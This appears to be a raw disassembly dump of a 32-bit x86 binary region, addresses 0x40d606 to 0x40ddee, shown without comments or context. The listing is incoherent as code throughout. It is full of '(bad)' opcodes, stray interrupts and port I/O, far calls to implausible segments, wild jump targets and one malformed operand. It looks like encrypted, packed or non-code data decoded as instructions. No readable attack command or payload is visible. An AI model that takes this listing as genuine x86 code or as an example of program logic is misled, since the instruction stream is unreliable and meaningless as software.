  40d606:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d607:	xor    eax,0x3f89a867
  40d60c:	cmc    
  40d60d:	cmp    DWORD PTR [edi+0x2b9ad79f],eax
  40d613:	std    
  40d614:	fisub  DWORD PTR [ebp-0x14a3a0f2]
  40d61a:	lods   al,BYTE PTR ds:[esi]
  40d61b:	sti    
  40d61c:	call   0x481d2433
  40d621:	mov    dh,0x7
  40d623:	test   edx,eax
  40d625:	cdq    
  40d626:	dec    ecx
  40d627:	addr16 jne 0x40d5d6
  40d62a:	popa   
  40d62b:	pop    edi
  40d62c:	shr    BYTE PTR [eax+eiz*1+0xcbafe05],cl
  40d633:	jno    0x40d5d8
  40d635:	ss int 0xc5
  40d638:	sbb    cl,BYTE PTR [ebp-0x4c]
  40d63b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d63c:	ror    bl,1
  40d63e:	or     BYTE PTR [ebx-0x62],cl
  40d641:	xor    BYTE PTR [esi+0x5bde94fa],cl
  40d647:	in     al,0x5a
  40d649:	fwait
  40d64a:	int3   
  40d64b:	out    dx,eax
  40d64c:	mov    al,0x86
  40d64e:	mov    ebp,0x4740ede
  40d653:	loope  0x40d6d3
  40d655:	mov    ds:0xb8e7ddfb,al
  40d65a:	shl    DWORD PTR [eax+0x31],cl
  40d65d:	fisttp QWORD PTR [ecx+0x2e3b7e4]
  40d663:	jnp    0x40d6dc
  40d665:	pop    esi
  40d666:	adc    al,0x33
  40d668:	dec    esp
  40d669:	xor    al,BYTE PTR [ebx]
  40d66b:	adc    al,0xe1
  40d66d:	ffree  st(0)
  40d66f:	cld    
  40d670:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d671:	lods   al,BYTE PTR ds:[esi]
  40d672:	adc    edi,DWORD PTR [eax-0x5a6e887]
  40d678:	pop    eax
  40d679:	int3   
  40d67a:	addr16 dec esi
  40d67c:	cmp    eax,0xa3fc9f20
  40d681:	(bad)  
  40d682:	outs   dx,BYTE PTR fs:[esi]
  40d684:	cmp    BYTE PTR [edx+0x23a10b5d],dl
  40d68a:	retf   
  40d68b:	pusha  
  40d68c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d68d:	pop    esi
  40d68e:	repz fild QWORD PTR [ebx-0x54]
  40d692:	dec    ecx
  40d693:	cmp    eax,0x46c2eb9b
  40d698:	jmp    0x4b250e9
  40d69d:	retf   
  40d69e:	mov    cl,0x21
  40d6a0:	dec    ebx
  40d6a1:	(bad)
  40d6a4:	pop    edx
  40d6a5:	mov    al,ds:0xaeab9002
  40d6aa:	(bad)  
  40d6ab:	gs push ebp
  40d6ad:	fwait
  40d6ae:	add    eax,0xac60d257
  40d6b3:	mov    eax,0x81b8201d
  40d6b8:	sub    bl,BYTE PTR [ecx+eiz*2-0x7a]
  40d6bc:	repz mov ebx,0x62908d4f
  40d6c2:	adc    BYTE PTR [edi],bl
  40d6c4:	rcl    dl,1
  40d6c6:	int    0x33
  40d6c8:	and    eax,0x1e7ae73e
  40d6cd:	dec    ecx
  40d6ce:	push   es
  40d6cf:	pop    DWORD PTR fs:[eax+0x34eb953e]
  40d6d6:	mov    dh,0x4e
  40d6d8:	push   esi
  40d6d9:	and    ah,bh
  40d6db:	sbb    dl,BYTE PTR [edi]
  40d6dd:	mov    edi,0x25c9b760
  40d6e2:	jmp    0xfbdbc78
  40d6e7:	fbld   TBYTE PTR [ecx+0x18017390]
  40d6ed:	dec    edx
  40d6ee:	jg     0x40d685
  40d6f0:	outs   dx,DWORD PTR ds:[esi]
  40d6f1:	inc    si
  40d6f3:	out    0x41,al
  40d6f5:	mov    edx,0x3bb7f44e
  40d6fa:	jo     0x40d74d
  40d6fc:	xchg   ecx,eax
  40d6fd:	popf   
  40d6fe:	push   es
  40d6ff:	pop    esi
  40d700:	jmp    0x40d77d
  40d702:	inc    ebx
  40d703:	jl     0x40d784
  40d705:	mov    ebp,cs
  40d707:	in     al,0x1b
  40d709:	dec    ebp
  40d70a:	pushf  
  40d70b:	stos   DWORD PTR es:[edi],eax
  40d70c:	js     0x40d71d
  40d70e:	in     al,0xe
  40d710:	(bad)  
  40d712:	mov    dl,ah
  40d714:	fldenv [edi]
  40d716:	pop    eax
  40d717:	adc    DWORD PTR [ebx+ecx*2],0xcddc3e57
  40d71e:	rcl    DWORD PTR [ecx+0x7be71703],cl
  40d724:	clc    
  40d725:	mul    DWORD PTR [esi+0x10c78eaf]
  40d72b:	inc    ebp
  40d72c:	sub    al,0xe4
  40d72e:	push   0xffffffbd
  40d730:	adc    BYTE PTR [eax],ah
  40d732:	mov    eax,ds:0x3150fb79
  40d737:	cmp    eax,0xfb17751f
  40d73c:	and    DWORD PTR [ebp-0x1cc78866],esi
  40d742:	add    DWORD PTR [ebx+0x44],edx
  40d745:	repnz jecxz 0x40d716
  40d748:	mov    DWORD PTR [esi-0x7b6d0ace],edx
  40d74e:	dec    ebx
  40d74f:	aaa    
  40d750:	xor    esi,ecx
  40d752:	dec    esi
  40d753:	addr16 int 0x4a
  40d756:	mov    dh,0x3e
  40d758:	xor    BYTE PTR [ecx-0x7b],dh
  40d75b:	(bad)  
  40d75c:	shl    BYTE PTR [ebx+ebp*1+0x4a],1
  40d760:	inc    esp
  40d761:	dec    edi
  40d762:	mov    bh,0xac
  40d764:	fwait
  40d765:	mov    ecx,esi
  40d767:	(bad)  
  40d768:	sti    
  40d769:	xchg   bh,ch
  40d76b:	mov    bh,BYTE PTR [ebp-0x2d620d2b]
  40d771:	out    dx,eax
  40d772:	jne    0x40d740
  40d774:	add    eax,0x4f39f70b
  40d779:	lods   al,BYTE PTR ds:[esi]
  40d77a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d77b:	clc    
  40d77c:	pop    eax
  40d77d:	jbe    0x40d725
  40d77f:	call   0x60b1:0x688f6b10
  40d786:	push   eax
  40d787:	(bad)  
  40d788:	mov    eax,0x5168b5fd
  40d78d:	cld    
  40d78e:	lahf   
  40d78f:	nop
  40d790:	mov    bl,0x9c
  40d792:	daa    
  40d793:	aad    0x61
  40d795:	and    ch,BYTE PTR ds:[ebx+0x52]
  40d799:	push   cs
  40d79a:	inc    edx
  40d79b:	inc    ebp
  40d79c:	cmp    eax,0xacd871c1
  40d7a1:	push   esp
  40d7a2:	and    eax,0x720d6bf1
  40d7a7:	stos   DWORD PTR es:[edi],eax
  40d7a8:	aaa    
  40d7a9:	dec    eax
  40d7aa:	loope  0x40d7c5
  40d7ac:	aad    0x7f
  40d7ae:	push   ebx
  40d7af:	and    eax,0x78a6101
  40d7b4:	repz loope 0x40d78f
  40d7b7:	out    0x2b,al
  40d7b9:	inc    esi
  40d7ba:	mov    BYTE PTR [ebx-0x5ca4db05],bh
  40d7c0:	inc    edi
  40d7c1:	leave  
  40d7c2:	fisttp WORD PTR [edi-0x53dcb80b]
  40d7c8:	test   eax,0xf89d62ad
  40d7cd:	loope  0x40d79d
  40d7cf:	mov    edx,0x957c0559
  40d7d4:	jae    0x40d771
  40d7d6:	dec    edx
  40d7d7:	push   edx
  40d7d8:	out    0xdd,al
  40d7da:	pop    esi
  40d7db:	mov    edx,fs
  40d7dd:	sbb    eax,0x32969db9
  40d7e2:	push   edi
  40d7e3:	ja     0x40d7d0
  40d7e5:	int    0x85
  40d7e7:	(bad)  [ebx]
  40d7e9:	adc    esp,edx
  40d7eb:	fiadd  WORD PTR [ecx]
  40d7ed:	div    DWORD PTR [eax+ecx*4+0x5a7f5f30]
  40d7f4:	adc    ch,BYTE PTR [ebp+0x7a]
  40d7f7:	sub    DWORD PTR [ecx],esi
  40d7f9:	sbb    BYTE PTR [ebp+0x24],dl
  40d7fc:	mov    esp,0xec81bf0b
  40d801:	or     edi,DWORD PTR [ebp+eax*4+0x7a41b2b6]
  40d808:	scas   al,BYTE PTR es:[edi]
  40d809:	rcl    DWORD PTR [eax],cl
  40d80b:	sub    BYTE PTR [eax-0x67],ah
  40d80e:	fs dec esp
  40d810:	fidiv  DWORD PTR [edx]
  40d812:	adc    al,0xff
  40d814:	and    BYTE PTR [ecx-0x6c],dl
  40d817:	mov    eax,ds:0x6484dc58
  40d81c:	outs   dx,BYTE PTR ds:[esi]
  40d81d:	adc    al,0xfb
  40d81f:	mov    ebp,0x5c580f7
  40d824:	ret    0x6432
  40d827:	std    
  40d828:	dec    edi
  40d829:	enter  0x4505,0x93
  40d82d:	clc    
  40d82e:	jns    0x40d869
  40d830:	mov    edi,0xbe2ac793
  40d835:	in     al,0xaa
  40d837:	(bad)  
  40d838:	stc    
  40d839:	push   ecx
  40d83a:	ret    
  40d83b:	ret    0x9c19
  40d83e:	jbe    0x40d840
  40d840:	push   ecx
  40d841:	inc    esi
  40d842:	cwde   
  40d843:	ror    DWORD PTR [esi],1
  40d845:	mov    ds,edi
  40d847:	push   ebp
  40d848:	inc    ebx
  40d849:	js     0x40d844
  40d84b:	pop    ecx
  40d84c:	push   esi
  40d84d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d84e:	inc    edi
  40d84f:	test   eax,0xdc0a6a23
  40d854:	ds mov dh,0x79
  40d857:	push   esp
  40d858:	sub    ebp,DWORD PTR [edi+0x54]
  40d85b:	ret    
  40d85c:	repz and ecx,DWORD PTR [ebx-0x521f0e93]
  40d863:	daa    
  40d864:	sbb    DWORD PTR [ebp-0x69a9eb8b],ebx
  40d86a:	out    0x64,eax
  40d86c:	sbb    cl,dh
  40d86e:	test   DWORD PTR [edi],edi
  40d870:	xchg   ecx,eax
  40d871:	rcpps  xmm2,XMMWORD PTR [edx-0x7d]
  40d875:	push   esi
  40d876:	mov    WORD PTR [ecx],es
  40d878:	out    0x9,al
  40d87a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d87b:	scas   al,BYTE PTR es:[edi]
  40d87c:	mov    cl,dh
  40d87e:	adc    eax,0x694db5e6
  40d883:	in     al,dx
  40d884:	xchg   DWORD PTR [ebp-0x80],ecx
  40d887:	imul   eax,DWORD PTR [edx-0x14fa7c1b],0xffffff91
  40d88e:	and    eax,0x4328a7e6
  40d893:	sbb    eax,0xc1f49dce
  40d898:	cdq    
  40d899:	cli    
  40d89a:	jno    0x40d8ef
  40d89c:	adc    esi,esi
  40d89e:	inc    esp
  40d89f:	cmp    ecx,ebx
  40d8a1:	bound  ebx,QWORD PTR [esi-0x17]
  40d8a4:	ja     0x40d8f0
  40d8a6:	pop    ebx
  40d8a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d8a8:	mov    ebx,0xa7e1b1ef
  40d8ad:	mov    ah,0x54
  40d8af:	jl     0x40d855
  40d8b1:	mov    BYTE PTR ds:[ebx],al
  40d8b4:	dec    ebx
  40d8b5:	test   DWORD PTR [ebp-0x467fecd],ebp
  40d8bb:	xlat   BYTE PTR ds:[ebx]
  40d8bc:	fwait
  40d8bd:	(bad)  
  40d8be:	daa    
  40d8bf:	fsubr  st(0),st
  40d8c1:	mov    ds:0x5861e13c,al
  40d8c6:	mov    bh,0xd3
  40d8c8:	sbb    DWORD PTR [ebp-0x6315780],eax
  40d8ce:	mov    esi,esp
  40d8d0:	out    dx,al
  40d8d1:	daa    
  40d8d2:	adc    ah,al
  40d8d4:	jne    0x40d908
  40d8d6:	and    BYTE PTR [ebp+0x7b],0xcf
  40d8da:	test   al,0x83
  40d8dc:	jnp    0x40d8d4
  40d8de:	pop    esp
  40d8df:	adc    esp,ebp
  40d8e1:	sar    BYTE PTR [eax-0x289465b0],1
  40d8e7:	lods   al,BYTE PTR ds:[esi]
  40d8e8:	xchg   DWORD PTR [ecx+edx*1+0x7e],ecx
  40d8ec:	or     BYTE PTR [esi+0x6463171b],bl
  40d8f2:	pop    ss
  40d8f3:	mov    ds:0x7bdb1779,al
  40d8f8:	xchg   DWORD PTR [esi+eiz*1],esp
  40d8fb:	ins    BYTE PTR es:[edi],dx
  40d8fc:	dec    edi
  40d8fd:	lods   eax,DWORD PTR ds:[esi]
  40d8fe:	add    al,0x4c
  40d900:	in     al,0x2a
  40d902:	nop
  40d903:	mov    edi,0xe74ce2d5
  40d908:	repnz dec esi
  40d90a:	retf   0x5d3d
  40d90d:	scas   eax,DWORD PTR es:[edi]
  40d90e:	inc    ecx
  40d90f:	and    DWORD PTR [edx],ebp
  40d911:	jo     0x40d96f
  40d913:	push   edi
  40d914:	cmp    esp,DWORD PTR [eax+edi*2+0x40]
  40d918:	jno    0x40d982
  40d91a:	and    BYTE PTR [eax],bl
  40d91c:	shr    BYTE PTR [ebp+eax*2+0x7cd8f012],1
  40d923:	stc    
  40d924:	jg     0x40d98f
  40d926:	outs   dx,BYTE PTR ds:[esi]
  40d927:	into   
  40d928:	pop    ebx
  40d929:	(bad)  
  40d92a:	add    ebp,eax
  40d92c:	aaa    
  40d92d:	and    bl,BYTE PTR [edi]
  40d92f:	xor    edi,DWORD PTR [esi-0x43f5acba]
  40d935:	loope  0x40d919
  40d937:	mov    al,0xd0
  40d939:	es jae 0x40d8c2
  40d93c:	xor    DWORD PTR [esp+edx*2-0x4722bd32],ebx
  40d943:	rcr    BYTE PTR [ecx+0x69],1
  40d946:	xor    esp,esp
  40d948:	call   0x505ae169
  40d94d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d94e:	add    edx,DWORD PTR [eax]
  40d950:	mov    bl,0x9b
  40d952:	xchg   BYTE PTR [eax-0x4f],dl
  40d955:	mov    ecx,0xaf42b601
  40d95a:	mov    dl,0x6f
  40d95c:	push   eax
  40d95d:	loopne 0x40d968
  40d95f:	pop    edx
  40d960:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d961:	out    dx,ax
  40d963:	xchg   esi,eax
  40d964:	pop    ebx
  40d965:	xchg   ebp,eax
  40d966:	sar    BYTE PTR [edx],0x15
  40d969:	xchg   DWORD PTR [eax],eax
  40d96b:	jle    0x40d953
  40d96d:	and    ecx,DWORD PTR [edi]
  40d96f:	mov    eax,ds:0x27634053
  40d974:	cmp    DWORD PTR [eax],0xffffffbf
  40d977:	bswap  ebp
  40d979:	(bad)  
  40d97a:	sti    
  40d97b:	(bad)  
  40d97d:	in     al,dx
  40d97e:	scas   al,BYTE PTR es:[edi]
  40d97f:	gs ins BYTE PTR es:[edi],dx
  40d981:	xor    eax,0xed91393a
  40d986:	inc    ebp
  40d987:	lods   eax,DWORD PTR ds:[esi]
  40d988:	add    dh,dh
  40d98a:	cmp    edi,DWORD PTR [edi+0x38b61638]
  40d990:	aam    0xa3
  40d992:	fwait
  40d993:	ret    0xf60e
  40d996:	dec    ebp
  40d997:	jmp    0x40d9de
  40d999:	adc    eax,0x8e523109
  40d99e:	jl     0x40d92c
  40d9a0:	outs   dx,DWORD PTR ds:[esi]
  40d9a1:	mov    cl,0x9a
  40d9a3:	(bad)  
  40d9a4:	sbb    al,0x89
  40d9a6:	sub    ebp,DWORD PTR [edx+esi*4-0x263994f5]
  40d9ad:	sub    BYTE PTR [ecx+0x29f330c9],ah
  40d9b3:	pop    ecx
  40d9b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d9b5:	inc    ecx
  40d9b6:	xchg   ch,al
  40d9b8:	push   0x6243906
  40d9bd:	jno    0x40da1d
  40d9bf:	push   ds
  40d9c0:	sub    BYTE PTR [eax+eax*2-0x2658621b],dh
  40d9c7:	xchg   esp,eax
  40d9c8:	fstp   DWORD PTR [ebp-0xa7110b4]
  40d9ce:	imul   esi,edx,0x88206eee
  40d9d4:	pop    edi
  40d9d5:	sbb    ecx,DWORD PTR [edi-0x63]
  40d9d8:	rcl    DWORD PTR [edx+0x54],1
  40d9db:	inc    edi
  40d9dc:	les    edi,FWORD PTR [edx+ebp*8+0x1b]
  40d9e0:	clc    
  40d9e1:	imul   ebp,DWORD PTR [ebp+0x68272eb1],0xffffffd4
  40d9e8:	fldenv [edi]
  40d9ea:	ds xchg ecx,eax
  40d9ec:	xor    edx,edi
  40d9ee:	mov    al,ds:0x610e6c45
  40d9f3:	mov    ss,WORD PTR [ebp+0x7e41255f]
  40d9f9:	repz push esi
  40d9fb:	jle    0x40d9b1
  40d9fd:	adc    bl,dh
  40d9ff:	sbb    ebx,DWORD PTR [eax]
  40da01:	cli    
  40da02:	ret    0x9fd4
  40da05:	cld    
  40da06:	inc    edi
  40da07:	jae    0x40d9a0
  40da09:	pop    ecx
  40da0a:	add    eax,0xe3203f01
  40da0f:	mov    dl,0xd0
  40da11:	repz sub eax,0xf5db46fc
  40da17:	xor    DWORD PTR [esi+0x2b],esp
  40da1a:	test   DWORD PTR [ebp-0x59ac7821],0xfc78f518
  40da24:	ja     0x40da04
  40da26:	jmp    DWORD PTR [edx+ecx*8+0x12ad61e]
  40da2d:	call   0xd114:0x1960b468
  40da34:	mov    es,esi
  40da36:	jns    0x40da78
  40da38:	push   ebp
  40da39:	inc    esp
  40da3a:	test   BYTE PTR [ebp-0x2c969a2e],0x7
  40da41:	xor    eax,0xf66f3404
  40da46:	sub    bl,BYTE PTR [eax-0x4e58bd29]
  40da4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da4d:	ss jnp 0x40d9fa
  40da50:	sub    esp,DWORD PTR [edi-0x71]
  40da53:	inc    ebx
  40da54:	push   esp
  40da55:	adc    ebx,DWORD PTR [edx]
  40da57:	inc    ebx
  40da58:	and    DWORD PTR [ecx+0x1b],edx
  40da5b:	cmp    eax,0x6c44c9d6
  40da60:	mov    edi,0xfdcc356c
  40da65:	pusha  
  40da66:	and    al,0xe5
  40da68:	outs   dx,DWORD PTR ds:[esi]
  40da69:	ss mov bl,0xb8
  40da6c:	jmp    0x40da1f
  40da6e:	call   0x221d8b02
  40da73:	cmp    eax,0xfa87ea01
  40da78:	jg     0x40da8f
  40da7a:	add    al,0xa8
  40da7c:	xor    BYTE PTR [edi+ebx*2-0x66b27df9],dh
  40da83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da84:	jle    0x40da9e
  40da86:	pop    ecx
  40da87:	mov    esp,0xe6a9e150
  40da8c:	int    0x95
  40da8e:	adc    DWORD PTR [esi+0x7d],edx
  40da91:	retf   0xf434
  40da94:	fs mov esi,gs
  40da97:	push   ebp
  40da98:	xchg   edx,eax
  40da99:	jl     0x40daac
  40da9b:	es or  ecx,ecx
  40da9e:	mov    DWORD PTR [esi-0x1f],esi
  40daa1:	(bad)  
  40daa3:	pop    ebx
  40daa4:	les    ecx,FWORD PTR [eax+ecx*1-0x3c]
  40daa8:	pop    ecx
  40daa9:	push   ds
  40daaa:	push   edi
  40daab:	xor    ebx,DWORD PTR [edx]
  40daad:	xchg   ebp,eax
  40daae:	push   ss
  40daaf:	mov    al,0xd4
  40dab2:	adc    ebx,DWORD PTR [edi+eax*1-0x61f06376]
  40dab9:	stc    
  40daba:	xor    BYTE PTR [edi+0x37],ch
  40dabd:	in     al,dx
  40dabe:	cmp    ah,BYTE PTR [eax+0x75cfe170]
  40dac4:	call   0xb8be:0x90d4ad8c
  40dacb:	mov    ebp,0x350de890
  40dad0:	pushf  
  40dad1:	inc    edx
  40dad2:	sbb    al,0x6
  40dad4:	adc    esi,esi
  40dad6:	jno    0x40dafa
  40dad8:	fisubr WORD PTR [edx+0x5d]
  40dadb:	inc    eax
  40dadc:	adc    esp,DWORD PTR [esi+0x3d4e1e32]
  40dae2:	leave  
  40dae3:	shl    BYTE PTR [edi+ebx*8-0x71],cl
  40dae7:	aad    0x5a
  40dae9:	ja     0x40daaa
  40daeb:	cmp    ebp,DWORD PTR [esp+edi*4]
  40daee:	mov    esi,0xc58fad4f
  40daf3:	and    al,dl
  40daf5:	sub    eax,0x70334d92
  40dafa:	and    ah,ah
  40dafc:	inc    ecx
  40dafd:	cwde   
  40dafe:	pop    edi
  40daff:	mov    dl,0x1e
  40db01:	xchg   esi,eax
  40db02:	push   ebp
  40db03:	cli    
  40db04:	dec    edx
  40db05:	dec    di
  40db07:	mov    eax,0x4d5dd63f
  40db0c:	mov    ch,0xfb
  40db0e:	es xchg esp,eax
  40db10:	test   al,0xb1
  40db12:	repz das 
  40db14:	sbb    eax,0x5a0a35fb
  40db19:	mov    BYTE PTR [edi+0x23],ah
  40db1c:	xlat   BYTE PTR ds:[ebx]
  40db1d:	push   0xcd6b0156
  40db22:	enter  0x590f,0x3b
  40db26:	mov    ds:0x37a7020c,eax
  40db2b:	js     0x40db91
  40db2d:	jge    0x40dad2
  40db2f:	push   esi
  40db30:	mov    eax,ds:0x3436f57e
  40db35:	popf   
  40db36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db37:	out    dx,al
  40db38:	mov    ebx,0x167864c9
  40db3d:	xchg   BYTE PTR [ebx+eax*4],ah
  40db40:	inc    ecx
  40db41:	xlat   BYTE PTR ds:[ebx]
  40db42:	pop    esp
  40db43:	(bad)  
  40db44:	sahf   
  40db45:	sub    DWORD PTR [edx],0x5af2b304
  40db4b:	adc    edx,DWORD PTR [ecx+0x4b66bdfd]
  40db51:	loopne 0x40dadb
  40db53:	in     eax,0x15
  40db55:	mov    al,BYTE PTR [ebx-0x71813c51]
  40db5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db5c:	cmp    eax,0xed5e7206
  40db61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db62:	outs   dx,BYTE PTR ds:[esi]
  40db63:	cld    
  40db64:	in     al,0x4
  40db66:	adc    BYTE PTR [eax],0x30
  40db69:	lahf   
  40db6a:	lahf   
  40db6b:	pop    ebx
  40db6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db6d:	int3   
  40db6e:	test   BYTE PTR [ebx],dh
  40db70:	test   BYTE PTR [ebx],ch
  40db72:	(bad)  
  40db73:	stos   BYTE PTR es:[edi],al
  40db74:	iret   
  40db75:	or     eax,0x8a1bf565
  40db7a:	sub    eax,0x562fb0d4
  40db7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db80:	dec    ecx
  40db81:	cmp    al,0x9c
  40db83:	mov    al,0xe7
  40db85:	mov    ebx,0x6a5a9fcd
  40db8a:	sub    al,bl
  40db8c:	push   ss
  40db8d:	xor    edi,ecx
  40db8f:	jmp    0x40db5a
  40db91:	jno    0x40dbc4
  40db93:	popa   
  40db94:	outs   dx,DWORD PTR ds:[esi]
  40db95:	je     0x40db56
  40db97:	cmp    DWORD PTR [edx-0x17fd1771],eax
  40db9d:	sub    BYTE PTR [ebx-0x6a],al
  40dba0:	sub    al,0x5c
  40dba2:	or     edx,eax
  40dba4:	(bad)  
  40dba5:	std    
  40dba6:	sub    bl,al
  40dba8:	out    0x2c,al
  40dbaa:	xchg   edx,eax
  40dbab:	lods   al,BYTE PTR ds:[esi]
  40dbac:	mov    ds:0x47a8b641,al
  40dbb1:	test   DWORD PTR [ebp-0x70],esi
  40dbb4:	stos   DWORD PTR es:[edi],eax
  40dbb5:	shl    BYTE PTR [ebx-0x1bb0b52f],1
  40dbbb:	in     eax,dx
  40dbbc:	xor    eax,0x60d40c81
  40dbc1:	mov    ?,WORD PTR [ecx-0x2f]
  40dbc4:	pop    esi
  40dbc5:	jae    0x40dbeb
  40dbc7:	retf   
  40dbc8:	xchg   BYTE PTR [eax+0x5f350e4b],bh
  40dbce:	iret   
  40dbcf:	(bad)  
  40dbd2:	or     eax,0x2e22cb84
  40dbd7:	xor    al,BYTE PTR [edx+eax*1+0x28]
  40dbdb:	add    edx,ebx
  40dbdd:	jbe    0x40dbdb
  40dbdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbe0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbe1:	xor    al,BYTE PTR [eax]
  40dbe3:	mov    ds:0x4020b823,al
  40dbe8:	push   0xc88ba634
  40dbed:	fsubr  DWORD PTR [ecx+0x2146f013]
  40dbf3:	pop    esi
  40dbf4:	cld    
  40dbf5:	fcomip st,st(2)
  40dbf7:	leave  
  40dbf8:	sbb    eax,0xb70dfc41
  40dbfd:	and    BYTE PTR [ebx+0x2058c99],0x4f
  40dc04:	add    esp,ecx
  40dc06:	mov    ebx,0x9a830521
  40dc0b:	loope  0x40dbcc
  40dc0d:	dec    esi
  40dc0e:	sub    eax,0xf25061c6
  40dc13:	(bad)  
  40dc14:	aam    0xc
  40dc16:	sbb    dh,BYTE PTR [esi-0x1cc982ab]
  40dc1c:	jbe    0x40dbaa
  40dc1e:	fsub   st(4),st
  40dc20:	scas   eax,DWORD PTR es:[edi]
  40dc21:	pop    es
  40dc22:	ins    BYTE PTR es:[edi],dx
  40dc23:	xchg   BYTE PTR [ebx+0x7],cl
  40dc26:	and    DWORD PTR [ebp-0x7afd14ce],0x7c841728
  40dc30:	lock aaa 
  40dc32:	lods   al,BYTE PTR ds:[esi]
  40dc33:	mov    bl,0x7
  40dc35:	ds push edi
  40dc37:	push   edi
  40dc38:	dec    edi
  40dc39:	jp     0x40dc5c
  40dc3b:	pop    es
  40dc3c:	add    BYTE PTR [eax],0xf2
  40dc3f:	adc    eax,0xc8bd7fa4
  40dc44:	xchg   esi,eax
  40dc45:	jp     0x40dcc4
  40dc47:	fwait
  40dc48:	(bad)  
  40dc49:	outs   dx,DWORD PTR ds:[esi]
  40dc4a:	push   ds
  40dc4b:	outs   dx,BYTE PTR ds:[esi]
  40dc4c:	es call 0x85b0:0x7d8b52ce
  40dc54:	mov    bl,0x62
  40dc56:	test   eax,0xbd6b817
  40dc5b:	cmc    
  40dc5c:	stc    
  40dc5d:	in     al,0x19
  40dc5f:	sahf   
  40dc60:	mov    edx,0x9e963b72
  40dc65:	mov    ch,0xfa
  40dc67:	rol    DWORD PTR [edi-0x3e22255b],0x3e
  40dc6e:	call   0xc5df:0x1a267e8a
  40dc75:	pop    esi
  40dc76:	jmp    0x59127e27
  40dc7b:	bound  ecx,QWORD PTR [edi+eiz*2-0x51]
  40dc7f:	mov    DWORD PTR [edx+0x62b62556],0x59fa0220
  40dc89:	popa   
  40dc8a:	popf   
  40dc8b:	scas   eax,DWORD PTR es:[edi]
  40dc8c:	mov    al,0xa3
  40dc8e:	inc    ebx
  40dc8f:	mov    ah,0xb5
  40dc91:	pop    es
  40dc92:	xor    ah,BYTE PTR [ebp+0x294850c4]
  40dc98:	imul   BYTE PTR [esi+0x0]
	...
  40dd12:	add    BYTE PTR [eax],al
  40dd14:	int3   
  40dd15:	(bad)
  40dd1a:	into   
  40dd1b:	imul   DWORD PTR [ecx-0x21a3b1b4]
  40dd21:	pop    ecx
  40dd22:	xor    al,0xec
  40dd24:	pop    ebx
  40dd25:	mov    eax,DWORD PTR [eax]
  40dd27:	add    BYTE PTR [esi+0x7],ch
  40dd2a:	add    BYTE PTR [eax],al
  40dd2c:	mov    edx,0x15c9f6ca
  40dd32:	sub    bh,BYTE PTR [ebx+0x169984d8]
  40dd38:	mov    al,ds:0x149d5db
  40dd3d:	xor    ebx,DWORD PTR [edx]
  40dd3f:	lock ja 0x40dcc4
  40dd42:	and    bh,bh
  40dd44:	(bad)  [esi-0x7ac63450]
  40dd4a:	xor    edi,edx
  40dd4c:	dec    ecx
  40dd4d:	mov    ecx,0x891088b3
  40dd52:	push   es
  40dd53:	dec    ebp
  40dd54:	mov    bh,0x1e
  40dd56:	ja     0x40dd17
  40dd58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd59:	das    
  40dd5a:	mov    DWORD PTR [eax],esp
  40dd5c:	cmp    DWORD PTR [ebx-0x509fea3c],edi
  40dd62:	call   0xc9d90e66
  40dd67:	jg     0x40dd2f
  40dd69:	xlat   BYTE PTR ds:[ebx]
  40dd6a:	sbb    DWORD PTR [eax],esp
  40dd6c:	outs   dx,BYTE PTR ds:[esi]
  40dd6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd6e:	sbb    al,0xd7
  40dd70:	pop    ecx
  40dd71:	rcl    DWORD PTR [ebx+eiz*1],1
  40dd74:	stos   BYTE PTR es:[edi],al
  40dd75:	jmp    0x40dd01
  40dd77:	out    dx,eax
  40dd78:	retf   0x33bf
  40dd7b:	adc    BYTE PTR [ecx],0x55
  40dd7e:	adc    DWORD PTR [esi-0x33],ecx
  40dd81:	pop    ss
  40dd82:	mov    dh,0xa7
  40dd84:	fs mov edx,0x37777f49
  40dd8a:	dec    ecx
  40dd8b:	or     eax,0x8d5d79d4
  40dd90:	popa   
  40dd91:	dec    eax
  40dd92:	push   ebx
  40dd93:	out    dx,al
  40dd94:	pop    esp
  40dd95:	sbb    eax,DWORD PTR [ecx+0x19c4d3ea]
  40dd9b:	push   ecx
  40dd9c:	enter  0xb4f8,0x23
  40dda0:	call   0xcf729f9
  40dda5:	adc    eax,0x143a68f2
  40ddaa:	(bad)  
  40ddab:	(bad)  
  40ddac:	mov    edx,0xcdfc5b62
  40ddb1:	mov    ch,0x2b
  40ddb3:	push   es
  40ddb4:	ror    DWORD PTR [edi],1
  40ddb6:	push   ss
  40ddb7:	shr    ebx,0x91
  40ddba:	xor    DWORD PTR [esp-0x2e],edi
  40ddbe:	mov    ds:0x772dea79,al
  40ddc3:	sbb    DWORD PTR [ebx-0x5a],esi
  40ddc6:	jle    0x40ddb0
  40ddc8:	fnsave [ebx-0x9de6765]
  40ddce:	mov    ecx,0x7a433643
  40ddd3:	adc    al,0xc4
  40ddd5:	sub    BYTE PTR [ecx-0x66],dh
  40ddd8:	jo     0x40ddb1
  40ddda:	mov    ebx,0xb6a126d9
  40dddf:	or     BYTE PTR [esi-0x52b496d6],ah
  40dde5:	jmp    0x459a:0x2098d115
  40ddec:	pusha  
  40dded:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ddee:	push   ecx
